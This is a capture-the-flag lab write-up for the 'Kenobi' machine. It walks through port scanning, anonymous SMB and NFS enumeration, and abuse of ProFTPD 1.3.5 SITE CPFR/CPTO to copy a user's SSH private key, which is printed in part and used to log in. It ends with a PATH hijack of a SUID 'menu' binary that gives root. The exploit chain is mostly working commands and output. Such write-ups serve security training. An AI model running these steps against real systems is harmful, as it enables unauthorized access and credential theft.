# Kenobi

2021-12-21

## Nmap

```

$•nmap -sV -sC -oN scan.nmap 10.10.247.119
Starting Nmap 7.80 ( https://nmap.org ) at 2021-12-21 20:25 CST
Nmap scan report for 10.10.247.119
Host is up (0.11s latency).
Not shown: 993 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_/admin.html
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      37215/udp6  mountd
|   100005  1,2,3      44837/tcp6  mountd
|   100005  1,2,3      52926/udp   mountd
|   100005  1,2,3      60365/tcp   mountd
|   100021  1,3,4      33725/tcp   nlockmgr
|   100021  1,3,4      43537/udp   nlockmgr
|   100021  1,3,4      45367/tcp6  nlockmgr
|   100021  1,3,4      48772/udp6  nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
2049/tcp open  nfs_acl     2-3 (RPC #100227)
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h00m00s, deviation: 3h27m51s, median: 0s
|_nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: kenobi
|   NetBIOS computer name: KENOBI\x00
|   Domain name: \x00
|   FQDN: kenobi
|_  System time: 2021-12-21T20:26:25-06:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-12-22T02:26:25
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.03 seconds
```

## SAMBA

Use nmap to scan SAMBA shares

```

$•nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.247.119
Starting Nmap 7.80 ( https://nmap.org ) at 2021-12-21 20:30 CST
Nmap scan report for 10.10.247.119
Host is up (0.16s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares:
|   account_used: guest
|   \\10.10.247.119\IPC$:
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.247.119\anonymous:
|     Type: STYPE_DISKTREE
|     Comment:
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.247.119\print$:
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>
|_smb-enum-users: ERROR: Script execution failed (use -d to debug)

Nmap done: 1 IP address (1 host up) scanned in 29.90 seconds
```

From this, we see anonymous access is available:

```

$•smbclient //10.10.247.119/anonymous
Enter WORKGROUP\sage's password:

Try "help" to get a list of possible commands.
smb: \> help

smb: \> ls
  .                                   D        0  Wed Sep  4 05:49:09 2019
  ..                                  D        0  Wed Sep  4 05:56:07 2019
  log.txt                             N    12237  Wed Sep  4 05:49:09 2019

                9204224 blocks of size 1024. 6877100 blocks available
smb: \> get log.txt
getting file \log.txt of size 12237 as log.txt (19.4 KiloBytes/sec) (average 19.4 KiloBytes/sec)
```

## rpcbind

RPCBind is running on port 111. Enumerate with nmap again:

```
$•nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.247.119
Starting Nmap 7.80 ( https://nmap.org ) at 2021-12-21 20:37 CST
Nmap scan report for 10.10.247.119
Host is up (0.16s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-showmount: 
|_  /var *

Nmap done: 1 IP address (1 host up) scanned in 1.44 seconds
```

We can combine the use of these two sources of info along with a vulnerable version of ProFTP to copy Kenobi's SSH key into an accessable directory: (`>` detonates the output from ProFTP)

```
nc 10.10.247.119 21
> 220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.247.119]

SITE CPFR /home/kenobi/.ssh/id_ra
> 350 File or directory exists, ready for destination name

SITE CPTO /var/tmp/id_rsa
> 250 Copy successful
```

Now to get the key, we can mount the nfs (RPCBind) share to our attack machine

```
$•mkdir mnt
$•sudo mount 10.10.247.119:/var mnt

$•ls -l mnt
total 48K
drwxr-xr-x  2 root root  4.0K Sep  4  2019 backups
drwxr-xr-x  9 root root  4.0K Sep  4  2019 cache
drwxrwxrwt  2 root root  4.0K Sep  4  2019 crash
drwxr-xr-x 40 root root  4.0K Sep  4  2019 lib
drwxrwsr-x  2 root staff 4.0K Apr 12  2016 local
lrwxrwxrwx  1 root root     9 Sep  4  2019 lock -> /run/lock
drwxrwxr-x 10 root kvm   4.0K Sep  4  2019 log
drwxrwsr-x  2 root mail  4.0K Feb 26  2019 mail
drwxr-xr-x  2 root root  4.0K Feb 26  2019 opt
lrwxrwxrwx  1 root root     4 Sep  4  2019 run -> /run
drwxr-xr-x  2 root root  4.0K Jan 29  2019 snap
drwxr-xr-x  5 root root  4.0K Sep  4  2019 spool
drwxrwxrwt  6 root root  4.0K Dec 21 20:42 tmp
drwxr-xr-x  3 root root  4.0K Sep  4  2019 www

$•cat mnt/tmp/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA4PeD0e0522UEj7xlrLmN68R6iSG3HMK/aTI812CTtzM9gnXs
qpweZL+GJBB59bSG3RTPtirC3M9YNTDsuTvxw9Y/+NuUGJIq5laQZS5e2RaqI1nv
U7fXEQlJrrlWfCy9VDTlgB/KRxKerqc42aU+/BrSyYqImpN6AgoNm/s/753DEPJt
[ SNIP ]
P7Y1PqPxnhW+SeDqtoepp3tu8kryMLO+OF6Vv73g1jhkUS/u5oqc8ukSi4MHHlU8
H94xjQKBgExhzreYXCjK9FswXhUU9avijJkoAsSbIybRzq1YnX0gSewY/SB2xPjF
S40wzYviRHr/h0TOOzXzX8VMAQx5XnhZ5C/WMhb0cMErK8z+jvDavEpkMUlR+dWf
Py/CLlDCU4e+49XBAPKEmY4DuN+J2Em/tCz7dzfCNS/mpsSEn0jo
-----END RSA PRIVATE KEY-----
```

Then, just ssh into the box

```
$•cp mnt/tmp/id_rsa idrsa

$•chmod 600 idrsa

$•ssh -i idrsa kenobi@10.10.247.119
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

103 packages can be updated.
65 updates are security updates.


Last login: Wed Sep  4 07:10:15 2019 from 192.168.1.147
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

kenobi@kenobi:~$ ls
share  user.txt

kenobi@kenobi:~$ cat user.txt
[REDACTED]
```

## Sticky Bits

```
rwS rwS rwT
  |   |   Sticky Bit
  |    SGID
   SUID
```

| Permission | On Files | On Directories
|---|---|---|
SUID Bit | User executes the file with permissions of the file owner | -
SGID Bit | User executes the file with the permission of the group owner. | File created in directory gets the same group owner.
Sticky Bit | No meaning | Users are prevented from deleting files from other users.

Search for SUIDs:

```
kenobi@kenobi:~$ find / -perm /4000 2>/dev/null

/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/menu
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
/bin/su
/bin/ping6
```

`menu` looks sus

# Strings

We run `strings` on `/usr/bin/menu` and discover that it uses the PATH-interpolated `curl` for it's use:

```
t
kenobi@kenobi:~$ strings /usr/bin/menu

/lib64/ld-linux-x86-64.so.2
libc.so.6
[ SNP ]
3. ifconfig
** Enter your choice :
curl -I localhost
uname -r
ifconfig
 Invalid choice
;*3$"
GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.11) 5.4.0 20160609
crtstuff.c
[ SNIP ]
.comment
```

We can override this path and get a root shell:

```
kenobi@kenobi:~$ cd /tmp
kenobi@kenobi:/tmp$ echo /bin/sh > curl
kenobi@kenobi:/tmp$ chmod 777 curl
kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
kenobi@kenobi:/tmp$ menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
# whoami
root
```